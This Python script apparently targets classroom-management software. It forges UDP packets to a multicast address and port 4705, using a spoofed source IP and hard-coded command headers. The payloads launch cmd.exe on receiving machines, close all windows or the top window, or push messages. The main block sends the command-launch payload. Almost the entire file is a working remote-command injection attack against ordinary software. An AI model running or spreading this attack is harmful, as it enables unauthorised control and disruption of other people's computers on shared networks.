#! /usr/bin/env python
import socket
import struct
import random
import Tcp_Injection as ti
# 16进制'0x00'形式输出bytes


def print_hex(bytes):
    l = [hex(int(i)) for i in bytes]
    print(" ".join(l))
 # 16进制 00 形式输出bytes


def print_hex2(bytes):
    l = [(''.join(hex(int(i))).replace("0x", '').zfill(2)) for i in bytes]
    print(' '.join(l))


def to16(str):
    l = ''
    if type(str) == type('a'):
        str = str.encode(encoding='utf-8')
    if type(str) == type('a'.encode(encoding='utf-8')):
        l = [(''.join(hex(int(i))).replace("0x", '').zfill(2)) for i in bytes]
        l = '0x' + (''.join(l))
    return l


class Data(object):
    """构造payload数据段"""

    def __init__(self, data='', cmd=''):
        super(Data, self).__init__()
        self.data = data
        self.cmd = cmd
        self.header_msg = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb,
            0xa0, 0xe7, 0x52, 0x40, 0x91, 0xdc, 0x27, 0xa3,
            0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00,
            0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00,
            0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00
        ]

        self.header_cmd = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x6e, 0x03, 0x00, 0x00, 0xaa, 0x92, 0x18, 0xa2,
            0xaa, 0x80, 0x92, 0x46, 0xb7, 0xd5, 0xad, 0x54,
            0x5b, 0x99, 0x8d, 0xc6, 0x20, 0x4e, 0x00, 0x00,
            0xc0, 0xa8, 0x1f, 0x0b, 0x61, 0x03, 0x00, 0x00,
            0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00,
            0x5c, 0x00, 0x57, 0x00, 0x49, 0x00, 0x4e, 0x00,
            0x44, 0x00, 0x4f, 0x00, 0x57, 0x00, 0x53, 0x00,
            0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00,
            0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00,
            0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00,
            0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00,
            0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]
        self.header_close_all_windows = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x2a, 0x02, 0x00, 0x00, 0x3d, 0xd6, 0x6e, 0xc3,
            0x5a, 0xe7, 0x5a, 0xc8, 0x1b, 0x8b, 0xad, 0x50,
            0xc5, 0xb0, 0xca, 0x73, 0x20, 0x4e, 0x00, 0x00,
            0xc0, 0xa8, 0x01, 0x9b, 0x1d, 0x02, 0x00, 0x00,
            0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x10,
            0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e,
            0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60,
            0x84, 0x76, 0x94, 0x5e, 0x28, 0x75, 0x0b, 0x7a,
            0x8f, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]
        self.header_close_top_windows = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x6e, 0x03, 0x00, 0x00, 0x4e, 0x1e, 0x91, 0xf0,
            0x7b, 0x48, 0xf6, 0x8a, 0x3c, 0xda, 0x55, 0x56,
            0x30, 0x75, 0x96, 0x7a, 0x20, 0x4e, 0x00, 0x00,
            0xc0, 0xa8, 0x01, 0x9b, 0x61, 0x03, 0x00, 0x00,
            0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0xe1, 0x02, 0x02, 0x0b, 0xa6, 0x15, 0xe1, 0x02,
            0x02, 0x0c, 0xa9, 0x15, 0x01, 0x00, 0x11, 0x2b,
            0x00, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x5e, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x50, 0x00, 0x00, 0xa0, 0x05, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00,
            0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xc0, 0xa8, 0x01, 0x9b, 0x04, 0x00, 0x00, 0x00,
            0x0c, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x20, 0x03, 0xe0, 0x01
        ]

    def pack(self):
        data = self.pkg_data(self.data)
        payload = struct.pack("%dB" % (len(data)), *data)
        # print_hex(payload)
        return payload
    # 格式化要发送的消息

    def format_4byte_send(self, content):
        arr = []
        for ch in content:
            tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
            if int(tmp, 16) > 0xff:
                tmp = tmp[2:]
                high = int((tmp[0] + tmp[1]), 16)
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
            else:
                high = 0
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
        return arr

    # 将要发送的消息打包成完整的指令

    def pkg_data(self, content):
        cmdd = {
            "cmd": self.header_cmd,
            "caw": self.header_close_all_windows,
            "ctw": self.header_close_top_windows,
            "msg": self.header_msg,
            "": self.header_msg
        }
        data_header = cmdd[self.cmd]
        for i in range(16):
            data_header[12 + i] = int(random.randint(0, 255))

        data_data = self.format_4byte_send(self.data)
        data = data_header + data_data
        l = [(0x00) for i in range(1000 - len(data_data))]
        return data + l


if __name__ == '__main__':
    source_ip = "10.0.0.1"
    destination_ip = "224.50.50.42"
    source_prot = random.randint(1, 65535)
    destination_port = 4705
    data = 'cmd'
    payload = Data(data=data, cmd='cmd').pack()

    try:
        ti.UDP(source_ip, destination_ip, source_prot,
               destination_port, payload).send()
    except Exception as e:
        print(e)
    else:
        print("UDP数据发送成功")
